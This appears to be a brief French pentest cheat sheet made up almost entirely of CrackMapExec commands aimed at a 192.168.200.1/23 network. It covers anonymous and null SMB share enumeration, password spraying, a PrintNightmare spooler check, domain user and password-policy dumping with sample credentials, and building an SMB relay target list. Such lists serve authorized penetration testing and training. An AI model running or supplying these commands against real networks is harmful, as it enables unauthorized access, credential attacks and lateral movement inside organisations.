Scan SMB anonymous sur les dossiers partagé
```
sudo crackmapexec smb 192.168.200.1/23 -u 'a' -p '' --shares
```

Scan SMB NULL sur les dossiers partagés du réseau
```
sudo crackmapexec smb 192.168.200.1/23 -u '' -p '' --shares
```

Password Spraying
```
sudo crackmapexec smb 192.168.200.1/23 -u users.txt -p users.txt --no-bruteforce
```

Attaque printnightmare spooler
```
sudo crackmapexec smb 192.168.200.1/23 -M spooler
```

Attaque SMB avec un compte utilisateur de base :
```
sudo crackmapexec smb 192.168.200.1/23 -u 'JOHN_DOE' -p 'P455w0rd4567' -d CORP --shares
```
Récupération de la liste des utilisateurs du domaine
```
sudo crackmapexec smb 192.168.200.1/23 -u 'JOHN_DOE' -p 'P455w0rd4567' -d CORP --users > AllUsers.txt
```
Récupération de la politique de mot de passe :
```
sudo crackmapexec smb 192.168.200.1/23 -u 'JOHN_DOE' -p 'P455w0rd4567' -d CORP --pass-pol
```
Liste des machines vulnérable aux attaque LLMNR
```
crackmapexec smb --gen-relay-list smb_targets.txt 192.168.200.1/23
```

```
```

```
```

